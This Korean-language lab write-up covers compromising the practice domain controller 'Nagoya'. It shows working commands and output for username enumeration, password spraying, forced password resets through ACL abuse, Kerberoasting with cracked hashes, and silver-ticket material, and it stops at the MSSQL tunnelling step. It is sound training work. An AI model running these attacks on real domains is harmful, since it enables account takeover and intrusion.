---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/partial
  - tech/enum/dirbust
  - tech/cred/spray
  - tech/cred/crack
  - tech/ad/bloodhound
  - tech/ad/kerberoast
  - tech/ad/acl-abuse
  - tech/ad/ticket-forge
  - tech/exec/winrm
  - tech/pivot/ligolo
  - tech/db/mssql
  - tech/win/seimpersonate
  - tech/win/potato
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.120.21
domain: nagoya-industries.com
ports: [53, 80, 135, 139, 389, 445, 593, 636, 3268, 3269, 3389, 5985, 9389]
services: [domain, globalcatldapssl, http, ldap, ldapssl, mc-nmf, microsoft-ds, ms-wbt-server, msrpc, ncacn_http, netbios-ssn]
status: partial
manual_tags: true
manual_cves: true
manual_status: true
tech_count: 13
---

> [!warning] 적대적 검증 정정 이력 (2026-08-20)
> 개작본을 `Nagoya.md.bak`(원본 손기록)·Kali `~/PG/Nagoya/` 산출물·`~/.zsh_history`·볼트 스크린샷 24장과 대조해 정정한 것들이다. 터미널 출력·명령·해시·플래그 값은 손대지 않았다.
>
> | 위치 | 무엇이 틀렸나 | 어떻게 고쳤나 |
> |---|---|---|
> | 6장 시간표 | 스크린샷 파일명(=붙여넣기 시각)을 사건 시각으로 단정. 3장의 유보를 스스로 어겼다 | 실측 앵커(mtime·로그 타임스탬프)와 상한(붙여넣기 시각)을 열로 분리 |
> | 6장 "실작업 3시간 40분" | 산수 오류 | 약 4시간 15분 |
> | 6장 "17시간 40분 공백" / "ligolo→플래그 21분" | 위 시각 오류에서 파생 | 약 17시간 30분 / 약 28분 |
> | 2-3장 "HELPDESK 가 20명 전원에 GenericAll" | 실제 21명 | 21명(= EMPLOYEES 멤버 전원)으로 정정 |
> | 4-3장 "MSSQL 이 BUILTIN\Administrators 를 sysadmin 으로 매핑하는 기본 설정" | **틀린 일반 지식.** SQL Server 2008 이후 기본 설치는 BUILTIN\Administrators 를 sysadmin 에 넣지 않는다. 이 인스턴스는 2022(160) | 관측된 사실만 남기고 매핑 경로는 `[가정]` |
> | 8장 `PacRequestorEnforcement` | **틀린 일반 지식.** 그건 KDC 발급 티켓용이라 실버티켓과 무관 | KB5020805(`KrbtgtFullPacSignature`)로 교체 + 이 박스 빌드가 그 이전임을 명시 |
> | 4-5·7장 "GetChangesAll = DCSync" | DCSync 는 GetChanges + GetChangesAll 둘 다 필요 | 두 권한의 출처를 나눠 서술 |
> | 3-2·6장 `net rpc password` "네 번" | 히스토리 실측과 불일치 | 실패 4줄 중 인용부호 미종결 3줄로 정정 |
> | 6장·1장 feroxbuster "913개까지 완주" | state 파일 실측: 913 = 200 열두 개 + 503 901개, 세 실행 모두 미완주 | 숫자와 완주 여부 정정 |
> | 5장 `proof.txt` 블록 | 스크린샷에 없는 `cd`/`dir` 명령행이 재구성돼 있고, 이 셸의 에코 특성과도 어긋남 | 스크린샷 원문대로 되돌리고 앞 절차는 산문으로 |
>
> **반증돼 그대로 둔 것** — `whoami` 가 `nagoya-ind\nagoya$` 로 나온 것(스크린샷 실물 확인, `[가정]` 강등이 타당), `klist` 의 2036년 만료(스크린샷 실물 확인), ligolo v0.8.2, `nxc-sweep` 의 SMB 공유 열거 블록(원본 손기록에 그대로 있다), ticketer 의 기본 그룹 513/512/520/518/519(impacket 소스 확인).

> [!info] 상단 요약
> **Nagoya** · PG Practice · Advanced · Windows Server 2019 도메인 컨트롤러 (`nagoya.nagoya-industries.com`, 192.168.120.21)
> 웹의 Team 페이지에서 실명 28개 → username-anarchy 로 계정명 405개 생성 → kerbrute 로 26개 확정 → 사이트 푸터의 `© 2023` 을 근거로 `Spring2023`~`Winter2023` 스프레이 → `craig.carr` 확보 → BloodHound 가 그린 ACL 사슬로 `christopher.lewis` 탈취(WinRM) → Kerberoast 로 `svc_mssql:Service1` 크랙 → **1433 이 외부에서 막혀 있어** ligolo-ng 로 터널을 뚫고 → svc_mssql 의 NT해시로 **MSSQL 실버티켓 위조** → `xp_cmdshell` → `SeImpersonatePrivilege` → PrintSpoofer.
> **확보 플래그: `proof.txt` 1개** (`local.txt` 는 기록에 없다. 5장 참조)

## 0. 이 박스에서 배우는 것

1. **웹 페이지의 사람 이름이 곧 계정 목록**이다. 실명 → 계정명 규칙 생성 → Kerberos 사전인증으로 존재 여부 확인, 이 3단 콤보.
2. **비밀번호 정책을 사이트에서 읽는다.** 푸터의 `© 2023` 하나로 스프레이 후보가 4개로 줄었다.
3. **ACL 사슬은 사람이 못 찾는다.** craig.carr 는 아무 그룹 관리자가 아니었다. BloodHound 가 없으면 2홉짜리 경로를 못 본다.
4. **실버티켓** — KDC 를 거치지 않고 서비스 계정 해시만으로 그 서비스에 대한 임의 사용자 티켓을 만든다. Kerberoast 로 크랙한 해시가 곧바로 관리자 세션이 되는 흐름.
5. **포트가 nmap 에 안 보인다고 서비스가 없는 게 아니다.** 1433 은 방화벽 뒤에 살아 있었고, 셸을 잡은 뒤 터널로 접근해야 했다.

**시험 출제 가능성** — 높다. OSCP AD 세트의 표준 형태에 매우 가깝다. 다만 시험에서는 실버티켓보다 Kerberoast → 크랙 → 그 계정으로 바로 WinRM/MSSQL 로그인이 흔하다. 이 박스는 `svc_mssql` 의 **로그인 권한이 막혀 있어서** 한 단계가 더 붙은 형태다.

---

## 1. 정찰

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ cat nmap.log
# Nmap 7.98 scan initiated Mon Jul  6 13:08:07 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.120.21
Nmap scan report for 192.168.120.21
Host is up (0.066s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Nagoya Industries - Nagoya
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=nagoya.nagoya-industries.com
| Not valid before: 2026-07-05T03:36:25
|_Not valid after:  2027-01-04T03:36:25
|_ssl-date: 2026-07-06T04:10:15+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: NAGOYA-IND
|   NetBIOS_Domain_Name: NAGOYA-IND
|   NetBIOS_Computer_Name: NAGOYA
|   DNS_Domain_Name: nagoya-industries.com
|   DNS_Computer_Name: nagoya.nagoya-industries.com
|   DNS_Tree_Name: nagoya-industries.com
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-06T04:09:35+00:00
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            .NET Message Framing
49666/tcp open  msrpc             Microsoft Windows RPC
49668/tcp open  msrpc             Microsoft Windows RPC
49676/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc             Microsoft Windows RPC
49679/tcp open  msrpc             Microsoft Windows RPC
49693/tcp open  msrpc             Microsoft Windows RPC
49708/tcp open  msrpc             Microsoft Windows RPC
49805/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: NAGOYA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-07-06T04:09:39
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

# Nmap done at Mon Jul  6 13:10:18 2026 -- 1 IP address (1 host up) scanned in 131.32 seconds
```

읽는 법:

- **53 + 389 + 445 + 3268 + 9389 = 도메인 컨트롤러다.** 9389(ADWS)와 3268(글로벌 카탈로그)은 DC 에만 뜬다. DC 라는 걸 확정하면 그 다음 행동이 정해진다 — LDAP 열거, kerbrute, BloodHound.
- `rdp-ntlm-info` 가 **인증 없이** 도메인명(`nagoya-industries.com`), NetBIOS 명(`NAGOYA-IND`), FQDN(`nagoya.nagoya-industries.com`), 빌드(`10.0.17763` = Server 2019)를 전부 뱉는다. 자격증명 0개 상태에서 얻을 수 있는 가장 밀도 높은 한 줄이다.
- **`Not shown: 65514 filtered`** — 이 줄이 나중에 결정적이 된다. 열린 21개 말고 나머지가 `closed` 가 아니라 `filtered` 다. 즉 **호스트 방화벽이 드롭하고 있다**는 뜻이고, "포트가 없다"가 아니라 "밖에서 안 보인다"는 뜻이다. 실제로 MSSQL(1433)이 여기 숨어 있었다(6장).
- `smb2-security-mode: signing enabled and required` — DC 기본값. SMB 릴레이는 이 호스트로는 안 된다는 뜻이므로 그 경로는 일찍 지운다.

`-Pn` 은 필수다. 이 박스는 ICMP 를 안 받는다. `--min-rate 5000` 없이 `-p-` 를 돌리면 filtered 포트 65514개에서 타임아웃을 다 기다린다.

### 웹 (80)

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ whatweb http://192.168.120.21
http://192.168.120.21 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@nagoya-industries.com,info@nagoyaindustries.com], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[192.168.120.21], JQuery, Microsoft-IIS[10.0], Script, Title[Nagoya Industries - Nagoya]
```

![[Pasted image 20260706145621.png]]

whatweb 은 IIS 10.0 까지만 말해준다. 프레임워크는 feroxbuster 결과에서 나왔다 — `/Nagoya.styles.css` 라는 파일명은 ASP.NET Core 의 **CSS isolation** 산출물(`<어셈블리명>.styles.css`)이고, `/index`·`/team`·`/error` 가 확장자 없이 200 을 주는 건 MVC 라우팅이다. 근거 두 개가 같은 곳을 가리키므로 "IIS 위의 ASP.NET Core 앱"으로 확정한다.

feroxbuster 로 나온 것 전부(상태 200):

```
/                          3530
/index                     3530
/team                      6896
/Team                      6896
/error                     3128
/Nagoya.styles.css         1123
/css/site.css /js/site.js /ship.jpg
/lib/bootstrap/... /lib/jquery/...
```

정적 자산과 페이지 3개가 전부다. **웹에는 취약점이 없다.** 이 박스에서 웹의 역할은 오직 하나 — 데이터 제공.

> [!warning] 여기서 스캐너를 계속 돌리면 시간을 태운다
> ferox 를 세 번 돌렸다(6장). 세 번째에 `-x html,txt,asp,aspx` 로 913개 응답을 받았지만 그중 901개가 503이고 200 은 세 번 모두 같은 12개였다.
> ASP.NET Core 는 **파일이 아니라 라우트**로 동작한다. 확장자 사전에 aspx 를 더하는 게 도움이 안 되는 이유다.

### 여기서 얻는 것 — 실명 28개

`/Team` 이 직원 명부를 표로 뿌린다.

![[Pasted image 20260706141343.png]]

```bash
curl -s http://192.168.120.21/Team | grep -oP '(?<=<td>)[A-Za-z]+' | paste - -
```

히스토리에는 화면으로 먼저 확인한 이 형태가 남아 있고, 같은 출력을 `names.txt` 로 받아 다음 단계에 넣었다. `paste - -` 가 두 줄씩(이름/성) 한 줄로 합친다. 결과 28행:

```
Matthew	Harrison
Emma	Miah
Rebecca	Bell
...
Joanne	Lewis
```

그리고 푸터에 **`© 2023 - Nagoya`**. 이 숫자를 기억해 둔다.

---

## 2. 취약점 분석

이 박스에 CVE 는 없다. 전부 **설정과 운영의 문제**다. 넷을 순서대로 쌓는다.

### 2-1. 실명 → 계정명 → 존재 확인

도메인 계정명 규칙은 조직마다 다르지만 후보는 유한하다. `username-anarchy` 가 이름 하나에서 `matthew` · `m.harrison` · `mharrison` · `harrison.m` … 식으로 전개한다.

```bash
┌──(kali㉿kali)-[~/git/username-anarchy]
└─$ ./username-anarchy -i /home/kali/PG/Nagoya/names.txt > users.txt
┌──(kali㉿kali)-[~/git/username-anarchy]
└─$ mv users.txt ~/PG/Nagoya
```

28명 × 14~15가지 = **405개 후보**. 이제 이 중 실재하는 것을 골라야 하는데, **AS-REQ 사전인증 응답의 에러 코드가 그걸 알려준다.**

존재하지 않는 계정이면 KDC 가 `KDC_ERR_C_PRINCIPAL_UNKNOWN` 을, 존재하면 `KDC_ERR_PREAUTH_REQUIRED` 를 돌려준다. kerbrute 는 이 차이만 보고 판정하며 **비밀번호를 보내지 않기 때문에 계정 잠금을 유발하지 않는다.** 이게 스프레이 전에 목록을 405 → 26 으로 줄이는 근거다.

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ /home/kali/git/kerbrute/kerbrute_linux_amd64 userenum -d nagoya-industries.com --dc 192.168.120.21 users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 07/06/26 - Ronnie Flathers @ropnop

2026/07/06 14:36:30 >  Using KDC(s):
2026/07/06 14:36:30 >   192.168.120.21:88

2026/07/06 14:37:51 >  [+] VALID USERNAME:       rebecca.bell@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       scott.gardner@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       terry.edwards@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       holly.matthews@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       anne.jenkins@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       brett.naylor@nagoya-industries.com
2026/07/06 14:37:52 >  [+] VALID USERNAME:       melissa.mitchell@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       craig.carr@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       fiona.clark@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       patrick.martin@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       kate.watson@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       kirsty.norris@nagoya-industries.com
2026/07/06 14:37:53 >  [+] VALID USERNAME:       andrea.hayes@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       abigail.hughes@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       melanie.watson@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       frances.ward@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       sylvia.king@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       wayne.hartley@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       iain.white@nagoya-industries.com
2026/07/06 14:37:54 >  [+] VALID USERNAME:       joanna.wood@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       bethan.webster@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       elaine.brady@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       christopher.lewis@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       megan.johnson@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       damien.chapman@nagoya-industries.com
2026/07/06 14:37:55 >  [+] VALID USERNAME:       joanne.lewis@nagoya-industries.com
2026/07/06 14:38:49 >  Done! Tested 405 usernames (26 valid) in 139.416 seconds
```

![[Pasted image 20260706144017.png]]

**26개가 전부 `이름.성` 형식이다.** 다른 규칙은 하나도 안 걸렸다 — 조직의 계정 규칙을 알아낸 셈이고, 이후 svc_ 계정 이름을 추측할 때도 이 규칙이 참고가 된다. 유효한 것만 `valid_users.txt` 로 손으로 추렸다(28명 중 `matthew.harrison`·`emma.miah` 는 kerbrute 목록에 없어 26개).

### 2-2. 비밀번호 정책을 웹에서 읽는다

AS-REP 로스팅부터 시도했는데 전멸이었다.

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ impacket-GetNPUsers nagoya-industries.com/ -usersfile valid_users.txt -no-pass -dc-ip 192.168.120.21 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User rebecca.bell doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User scott.gardner doesn't have UF_DONT_REQUIRE_PREAUTH set
...
[-] User joanne.lewis doesn't have UF_DONT_REQUIRE_PREAUTH set
```

(26줄 전부 같은 메시지. 원문은 `~/PG/Nagoya/` 세션 기록 참조.)

그러면 남는 건 스프레이인데, **무엇을 뿌릴 것인가**가 문제다. rockyou 를 26개 계정에 뿌리면 잠금 정책에 걸려 박스를 망가뜨린다.

여기서 웹 푸터의 `© 2023` 이 힌트가 된다. 계절+연도는 만료 주기가 90일인 조직에서 사람이 실제로 만드는 비밀번호다. 후보는 넷뿐이다.

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ cat season_pass.txt
Spring2023
Summer2023
Fall2023
Winter2023
```

26계정 × 4비번 = 104회. 총 횟수는 커 보여도 **계정당 4회**다. 잠금은 계정별로 세므로 이게 실제 위험치고, 조직에서 흔히 쓰는 임계값(5~10) 아래다. 정확한 정책은 자격증명을 하나 얻은 뒤 `nxc smb <DC> -u … -p … --pass-pol` 로 읽어서 확인할 수 있다 — 이 박스에서는 읽어보지 않았다. 어느 쪽이든 **뿌리기 전에 계정당 횟수를 세는 습관**이 요점이다.

### 2-3. 두 개의 그룹이 만든 ACL 사슬

`craig.carr` 를 잡고 BloodHound 를 돌렸을 때 나온 그림이 이 박스의 실체다.

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ bloodhound-python -d nagoya-industries.com -u 'craig.carr' -p 'Spring2023' -ns 192.168.120.21 -c all --dns-timeout 30
```

![[Pasted image 20260706154413.png]]

![[Pasted image 20260706154341.png]]

수집 JSON(`~/PG/Nagoya/20260706153247_*.json`)에서 실제 경로를 뽑으면 이렇다:

| 홉 | 주체 | 권한 | 대상 | 근거 |
|---|---|---|---|---|
| 1 | `craig.carr` ∈ **EMPLOYEES** | GenericAll | `iain.white` | EMPLOYEES 가 iain.white·joanna.wood·bethan.webster·svc_helpdesk 에 GenericAll |
| 2 | `iain.white` ∈ **HELPDESK** | GenericAll | `christopher.lewis` | HELPDESK 가 **EMPLOYEES 멤버 21명 전원**에 GenericAll |
| 3 | `christopher.lewis` ∈ **DEVELOPERS** | — | WinRM 로그인 | DEVELOPERS 가 **Remote Management Users** 의 유일한 멤버 |

HELPDESK 의 GenericAll 대상 21명은 EMPLOYEES 의 멤버 21명과 **정확히 같은 집합**이다(위 154341 스크린샷의 부채꼴이 그것이고, `20260706153247_users.json` 의 ACE 를 세도 21). 즉 "HELPDESK 가 일반 직원 전원을 관리한다"는 위임을 그대로 옮긴 설정이다.

**왜 2홉이 필요한가.** craig.carr 는 EMPLOYEES 소속이라 iain.white 는 건드릴 수 있지만 christopher.lewis 는 못 건드린다. christopher.lewis 를 통제하는 건 HELPDESK 인데 craig.carr 는 HELPDESK 가 아니다. 그런데 **iain.white 가 HELPDESK 멤버**다. 그래서 iain.white 를 경유지로 쓴다.

**왜 굳이 christopher.lewis 인가.** Remote Management Users 의 멤버가 `DEVELOPERS` 그룹 하나이고, EMPLOYEES/HELPDESK 가 손댈 수 있는 계정 중 DEVELOPERS 소속은 `christopher.lewis` 뿐이다(나머지 DEVELOPERS 멤버 joanne.lewis·damien.chapman·megan.johnson·elaine.brady 는 ACCOUNT OPERATORS 만 통제한다). **셸이 되는 계정은 하나였다.**

> [!tip] GenericAll on user = 비밀번호 재설정
> 사용자 객체에 대한 GenericAll/ForceChangePassword 는 **기존 비밀번호를 몰라도** 새 비밀번호를 박을 수 있다는 뜻이다.
> 티가 나는 행위라서 실무에선 위험하지만 랩/시험에서는 가장 짧은 경로다. 원본 비밀번호는 복구할 수 없으니 보고서에 "변경했다"를 반드시 남긴다.

### 2-4. Kerberoast → 실버티켓

BloodHound 와 별개로 SPN 계정 둘이 있었다.

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ impacket-GetUserSPNs nagoya-industries.com/craig.carr:Spring2023 -dc-ip 192.168.120.21 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName                Name          MemberOf                                          PasswordLastSet             LastLogon                   Delegation
----------------------------------  ------------  ------------------------------------------------  --------------------------  --------------------------  ----------
http/nagoya.nagoya-industries.com   svc_helpdesk  CN=helpdesk,CN=Users,DC=nagoya-industries,DC=com  2023-04-30 16:31:06.190955  <never>
MSSQL/nagoya.nagoya-industries.com  svc_mssql                                                       2023-04-30 16:45:33.288595  2024-08-02 10:48:41.441299

[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_helpdesk$NAGOYA-INDUSTRIES.COM$nagoya-industries.com/svc_helpdesk*$ff27c107da97f9e7c755bae8cca8f1d0$d21ba6d4194bc28611ef2974bb218ee946a7cca4461838d0a3dd0d5f0ed97ee9…(2389자, 전문은 ~/PG/Nagoya/hash.txt)
$krb5tgs$23$*svc_mssql$NAGOYA-INDUSTRIES.COM$nagoya-industries.com/svc_mssql*$6f15123e21a1df6ae63fc333287e9043$d952b84710651a54baa879d839c5cce61e18c3c495ecbd93abde51dae0079da…(2383자, 동)
```

`-request` 가 붙어야 TGS 를 실제로 받아온다. 빼면 SPN 목록만 나온다. `$krb5tgs$23$` 의 **23 = RC4-HMAC(etype 23)** 이고, 이건 티켓이 서비스 계정의 **NT해시 그대로**로 암호화됐다는 뜻이다. 그래서 오프라인 크랙이 성립한다(etype 18/AES 면 hashcat 모드가 19700 으로 바뀌고 훨씬 느리다).

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting
...
Hashes: 2 digests; 2 unique digests, 2 unique salts
...
$krb5tgs$23$*svc_mssql$NAGOYA-INDUSTRIES.COM$…(중략)…:Service1
Approaching final keyspace - workload adjusted.

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Time.Started.....: Mon Jul  6 15:56:03 2026 (9 secs)
Speed.#01........:  1724.0 kH/s (1.28ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts
Progress.........: 28688770/28688770 (100.00%)
```

**`svc_mssql : Service1`**. 9초 걸렸다. `svc_helpdesk` 는 rockyou 로 안 깨졌다(`Recovered 1/2`, `Status: Exhausted`).

여기서 문제가 생긴다 — 비밀번호를 알아냈는데 **그 계정으로 아무 데도 못 들어간다**(6장). 그래서 비밀번호를 로그인이 아니라 **암호 재료**로 쓴다.

> [!note] 실버티켓이 성립하는 이유
> Kerberos 의 서비스 티켓(TGS)은 **서비스 계정의 키로 암호화**되어 있고, 서비스는 그 키로 복호화해서 안에 든 PAC(사용자 신원과 그룹 SID)을 그대로 믿는다.
> 그러니 그 키(= NT해시)를 알면 **KDC 를 거치지 않고** "나는 Administrator(RID 500)이고 Domain Admins 소속이다"라고 적힌 티켓을 직접 만들어 넣을 수 있다.
> 제약은 두 가지다 — (1) 그 **서비스 하나에만** 통한다(여기서는 MSSQL). TGT 가 아니라서 다른 서비스로는 못 간다. (2) PAC 안의 서명을 검증당하면 막힌다. 서버 체크섬은 서비스 키로 만들 수 있어 문제가 없지만, KB5020805(CVE-2022-37967)가 추가한 **krbtgt 키로 서명하는 full PAC signature** 는 위조할 수 없다. 이 타깃은 빌드 `10.0.17763.4252`(2023-04 누적)이고 그 서명의 **강제 적용 기본값은 2023-07 부터**라, 여기서는 그 벽에 안 걸렸다.
> 골든티켓은 같은 원리를 `krbtgt` 해시에 적용한 것이고, 그래서 **도메인 전체**에 통한다.

실버티켓에 필요한 재료 네 가지와 이 박스에서의 조달처:

| 재료 | 값 | 어디서 |
|---|---|---|
| 서비스 계정 NT해시 | `e3a0168bc21cfb88b95c954a5b18f57c` | 평문 `Service1` → MD4(UTF-16LE) |
| 도메인 SID | `S-1-5-21-1969309164-1513403977-1686805993` | `impacket-lookupsid` 또는 WinRM 에서 `WindowsIdentity` |
| SPN | `MSSQL/nagoya.nagoya-industries.com` | GetUserSPNs 출력 |
| 사칭할 RID | `500` (Administrator) | 고정 |

---

## 3. Foothold

### 3-1. 스프레이

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ nxc smb 192.168.120.21 -u valid_users.txt -p season_pass.txt --continue-on-success
SMB         192.168.120.21  445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False)
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\rebecca.bell:Spring2023 STATUS_LOGON_FAILURE
SMB         192.168.120.21  445    NAGOYA           [-] nagoya-industries.com\scott.gardner:Spring2023 STATUS_LOGON_FAILURE
…(중략)…
SMB         192.168.120.21  445    NAGOYA           [+] nagoya-industries.com\craig.carr:Spring2023
…(중략)…
SMB         192.168.120.21  445    NAGOYA           [+] nagoya-industries.com\fiona.clark:Summer2023
…(중략, Fall2023·Winter2023 전부 STATUS_LOGON_FAILURE)…
```

**`--continue-on-success` 가 없으면 첫 성공에서 멈춘다.** 그러면 `fiona.clark:Summer2023` 을 못 봤을 것이다. 이 박스에서는 결과적으로 craig.carr 만 썼지만, 계정이 여럿 나오면 권한이 다를 수 있으니 스프레이는 항상 끝까지 돌린다.

`-u` 와 `-p` 에 **파일 경로**를 주면 nxc 가 전체 조합(26×4)을 돌린다. 순서는 비밀번호 바깥 루프 — 즉 "전 계정에 Spring2023" → "전 계정에 Summer2023" 순이다. 잠금 정책 관점에서 이 순서가 옳다(한 계정을 연속으로 때리지 않는다).

### 3-2. ACL 사슬로 셸 되는 계정 탈취

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ net rpc password "iain.white" 'Password123!' -U "nagoya-industries.com/craig.carr%Spring2023" -S 192.168.120.21

┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ net rpc password 'christopher.lewis' 'Password123!' -U 'nagoya-industries.com/iain.white%Password123!' -S 192.168.120.21

┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ evil-winrm -i 192.168.120.21 -u christopher.lewis -p 'Password123!'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> whoami
nagoya-ind\christopher.lewis
```

`net rpc password <대상> <새비번> -U <도메인>/<주체>%<주체비번> -S <DC>` 가 SAMR 로 비밀번호를 바꾼다. 성공하면 **아무것도 출력하지 않는다** — 조용한 게 정상이다.

> [!danger] 이 명령의 인용부호가 이 박스에서 제일 많이 시간을 잡아먹었다
> `Password123!` 의 `!` 는 zsh 에서 **히스토리 확장**이다. 큰따옴표 안에서도 확장되므로 반드시 **작은따옴표**로 감싼다.
> 실제로 `~/.zsh_history` 에 실패한 시도가 **네 줄** 남아 있다 — 그중 셋은 `-U "…%Password123` 의 큰따옴표를 닫지 않았고, 셋은 줄 끝에 `\` 가 붙어 셸이 다음 줄을 기다렸다(둘 다인 것이 둘). 자세한 건 6장.

### 3-3. 1433 이 안 보인다 → ligolo-ng

svc_mssql 의 비밀번호를 알고 있어도 MSSQL 에 붙을 수가 없었다. nxc 스윕이 그 이유를 말해준다:

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ nxc-sweep 192.168.120.21 -u svc_mssql -p 'Service1'
[*] Starting NXC sweep for 192.168.120.21 as svc_mssql ...

[+] Port 445 open. Checking smb ...
SMB         192.168.120.21  445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False)
SMB         192.168.120.21  445    NAGOYA           [+] nagoya-industries.com\svc_mssql:Service1
SMB         192.168.120.21  445    NAGOYA           [*] Enumerated shares
SMB         192.168.120.21  445    NAGOYA           Share           Permissions     Remark
SMB         192.168.120.21  445    NAGOYA           -----           -----------     ------
SMB         192.168.120.21  445    NAGOYA           ADMIN$                          Remote Admin
SMB         192.168.120.21  445    NAGOYA           C$                              Default share
SMB         192.168.120.21  445    NAGOYA           IPC$            READ            Remote IPC
SMB         192.168.120.21  445    NAGOYA           NETLOGON        READ            Logon server share
SMB         192.168.120.21  445    NAGOYA           SYSVOL          READ            Logon server share

[+] Port 5985 open. Checking winrm ...
WINRM       192.168.120.21  5985   NAGOYA           [*] Windows 10 / Server 2019 Build 17763 (name:NAGOYA) (domain:nagoya-industries.com)
WINRM       192.168.120.21  5985   NAGOYA           [-] nagoya-industries.com\svc_mssql:Service1

[+] Port 3389 open. Checking rdp ...
RDP         192.168.120.21  3389   NAGOYA           [*] Windows 10 or Windows Server 2016 Build 17763 (name:NAGOYA) (domain:nagoya-industries.com) (nla:False)
RDP         192.168.120.21  3389   NAGOYA           [+] nagoya-industries.com\svc_mssql:Service1

[-] Port 1433 closed/filtered. Skipping mssql

